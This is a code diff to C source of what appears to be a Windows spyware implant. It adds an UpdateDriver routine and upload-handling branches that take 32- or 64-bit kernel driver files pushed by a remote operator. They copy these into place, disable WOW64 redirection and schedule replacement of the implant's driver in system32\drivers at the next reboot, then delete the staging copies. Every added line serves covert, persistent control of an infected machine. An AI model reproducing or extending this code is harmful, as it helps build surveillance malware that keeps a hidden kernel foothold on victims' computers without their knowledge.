@@ -15,6 +15,8 @@
 #include "DeepFreeze.h"
 #include "format_resistant.h"
 
+extern BOOL IsDriverRunning(WCHAR *driver_name);
+
 typedef struct {
 	DWORD agent_tag;
 	HANDLE h_file;
@@ -1435,6 +1437,23 @@ WCHAR *LOG_CompleteWild(WCHAR *wild_path, WCHAR *file_name, WCHAR *dest_path)
 	return dest_path;
 }
 
+void UpdateDriver(char *source_path)
+{
+	char sys_path[DLLNAMELEN];
+	char comp_path[DLLNAMELEN*2];
+	PVOID old_value;
+
+	if (!IsDriverRunning(DRIVER_NAME_W))
+		return;
+	
+	if (!FNC(GetEnvironmentVariableA)("SystemRoot", sys_path, sizeof(sys_path)))
+		return;
+	sprintf(comp_path, "%s%s%s", sys_path, "\\system32\\drivers\\", DRIVER_NAME);
+	
+	old_value = DisableWow64Fs();
+	FNC(MoveFileExA)(source_path, comp_path, MOVEFILE_DELAY_UNTIL_REBOOT);
+	RevertWow64Fs(old_value);
+}
 
 // I file uploadati vengono messi nella working dir.
 // Torna FALSE se qualcosa fallisce.
@@ -1499,6 +1518,23 @@ BOOL LOG_HandleUpload(BOOL is_upload)
 		} else if(!strcmp(c_file_name, COMMON_EXE_INSTALLER_NAME)) {
 			CopyFile(HM_CompletePath(COMMON_EXE_INSTALLER_NAME, s_file_path), HM_CompletePath(EXE_INSTALLER_NAME, d_file_path), FALSE);
 			DeleteFile(HM_CompletePath(c_file_name, s_file_path));
+
+		} else if(!strcmp(c_file_name, COMMON_DRV32_NAME)) {
+			if (!IsX64System()) {
+				CopyFile(HM_CompletePath(COMMON_DRV32_NAME, s_file_path), HM_CompletePath(H4DRIVER_NAME, d_file_path), FALSE);
+				UpdateDriver(d_file_path);
+			} else
+				CopyFile(HM_CompletePath(COMMON_DRV32_NAME, s_file_path), HM_CompletePath(H4DRIVER_NAME_ALT, d_file_path), FALSE);
+			DeleteFile(HM_CompletePath(c_file_name, s_file_path));
+
+		} else if(!strcmp(c_file_name, COMMON_DRV64_NAME)) {
+			if (IsX64System()) {
+				CopyFile(HM_CompletePath(COMMON_DRV64_NAME, s_file_path), HM_CompletePath(H4DRIVER_NAME, d_file_path), FALSE);
+				UpdateDriver(d_file_path);
+			} else
+				CopyFile(HM_CompletePath(COMMON_DRV64_NAME, s_file_path), HM_CompletePath(H4DRIVER_NAME_ALT, d_file_path), FALSE);
+			DeleteFile(HM_CompletePath(c_file_name, s_file_path));
+
 		} else {
 			HM_CompletePath(c_file_name, d_file_path);
 		}
